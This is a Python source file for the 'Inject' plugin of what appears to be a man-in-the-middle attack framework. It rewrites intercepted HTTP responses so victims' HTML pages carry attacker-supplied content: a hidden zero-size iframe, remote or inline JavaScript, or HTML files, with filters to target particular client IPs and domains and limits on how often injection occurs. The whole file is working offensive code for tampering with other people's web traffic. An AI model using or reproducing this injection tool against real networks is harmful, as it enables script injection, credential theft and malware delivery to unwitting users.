# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import time
import sys
import re
import chardet

from bs4 import BeautifulSoup
from plugins.plugin import Plugin

class Inject(Plugin):
    name       = "Inject"
    optname    = "inject"
    desc       = "Inject arbitrary content into HTML content"
    version    = "0.4"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options       = options
        self.ip            = options.ip

        self.html_url      = options.html_url
        self.html_payload  = options.html_payload
        self.html_file     = options.html_file
        self.js_url        = options.js_url
        self.js_payload    = options.js_payload
        self.js_file       = options.js_file

        self.rate_limit    = options.rate_limit
        self.count_limit   = options.count_limit
        self.per_domain    = options.per_domain
        self.black_ips     = options.black_ips.split(',')
        self.white_ips     = options.white_ips.split(',')
        self.white_domains = options.white_domains.split(',')
        self.black_domains = options.black_domains.split(',')
        
        self.ctable        = {}
        self.dtable        = {}
        self.count         = 0

    
    def response(self, response, request, data):

        encoding = None
        ip = response.getClientIP()
        hn = response.getRequestHostname()

        if not response.responseHeaders.hasHeader('Content-Type'):
            return {'response': response, 'request':request, 'data': data}

        mime = response.responseHeaders.getRawHeaders('Content-Type')[0]

        if "text/html" not in mime:
            return {'response': response, 'request':request, 'data': data}

        if "charset" in mime:
            match = re.search('charset=(.*)', mime)
            if match:
                encoding = match.group(1).strip().replace('"', "")
            else:
                try:
                    encoding = chardet.detect(data)["encoding"]
                except:
                    pass
        else:
            try:
                encoding = chardet.detect(data)["encoding"]
            except:
                pass

        if self._should_inject(ip, hn) and self._ip_filter(ip) and self._host_filter(hn) and (hn not in self.ip) and ("text/html" in mime):

    	    if encoding is not None:
                html = BeautifulSoup(data.decode(encoding, "ignore"), "lxml")
    	    else:
                html = BeautifulSoup(data, "lxml")

            if html.body:

                if self.html_url:
                    iframe = html.new_tag("iframe", src=self.html_url, frameborder=0, height=0, width=0)
                    html.body.append(iframe)
                    self.clientlog.info("Injected HTML Iframe: {}".format(hn), extra=request.clientInfo)

                if self.html_payload:
                    payload = BeautifulSoup(self.html_payload, "html.parser")
                    html.body.append(payload)
                    self.clientlog.info("Injected HTML payload: {}".format(hn), extra=request.clientInfo)

                if self.html_file:
                    with open(self.html_file, 'r') as file:
                        payload = BeautifulSoup(file.read(), "html.parser")
                        html.body.append(payload)
                    self.clientlog.info("Injected HTML file: {}".format(hn), extra=request.clientInfo)

                if self.js_url:
                    script = html.new_tag('script', type='text/javascript', src=self.js_url)
                    html.body.append(script)
                    self.clientlog.info("Injected JS script: {}".format(hn), extra=request.clientInfo)

                if self.js_payload:
                    tag = html.new_tag('script', type='text/javascript')
                    tag.append(self.js_payload)
                    html.body.append(tag)
                    self.clientlog.info("Injected JS payload: {}".format(hn), extra=request.clientInfo)

                if self.js_file:
                    tag = html.new_tag('script', type='text/javascript')
                    with open(self.js_file, 'r') as file:
                        tag.append(file.read())
                        html.body.append(tag)
                    self.clientlog.info("Injected JS file: {}".format(hn), extra=request.clientInfo)

                data = str(html)

        return {'response': response, 'request':request, 'data': data}

    def _ip_filter(self, ip):

        if self.white_ips[0] != '':
            if ip in self.white_ips:
                return True
            else:
                return False

        if self.black_ips[0] != '':
            if ip in self.black_ips:
                return False
            else:
                return True

        return True

    def _host_filter(self, host):

        if self.white_domains[0] != '':
            if host in self.white_domains:
                return True
            else:
                return False

        if self.black_domains[0] != '':
            if host in self.black_domains:
                return False
            else:
                return True

        return True

    def _should_inject(self, ip, hn):

        if self.count_limit == self.rate_limit is None and not self.per_domain:
            return True

        if self.count_limit is not None and self.count > self.count_limit:
            return False

        if self.rate_limit is not None:
            if ip in self.ctable and time.time()-self.ctable[ip] < self.rate_limit:
                return False

        if self.per_domain:
            return not ip+hn in self.dtable

        return True

    def options(self, options):
        options.add_argument("--js-url", type=str, help="URL of the JS to inject")
        options.add_argument('--js-payload', type=str, help='JS string to inject')
        options.add_argument('--js-file', type=str, help='File containing JS to inject')
        options.add_argument("--html-url", type=str, help="URL of the HTML to inject")
        options.add_argument("--html-payload", type=str, help="HTML string to inject")
        options.add_argument('--html-file', type=str, help='File containing HTML to inject')

        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument("--per-domain", action="store_true", help="Inject once per domain per client.")
        group.add_argument("--rate-limit", type=float, help="Inject once every RATE_LIMIT seconds per client.")
        group.add_argument("--count-limit", type=int, help="Inject only COUNT_LIMIT times per client.")
        group.add_argument("--white-ips", metavar='IP', default='', type=str, help="Inject content ONLY for these ips (comma seperated)")
        group.add_argument("--black-ips", metavar='IP', default='', type=str, help="DO NOT inject content for these ips (comma seperated)")
        group.add_argument("--white-domains", metavar='DOMAINS', default='', type=str, help="Inject content ONLY for these domains (comma seperated)")
        group.add_argument("--black-domains", metavar='DOMAINS', default='', type=str, help="DO NOT inject content for these domains (comma seperated)")
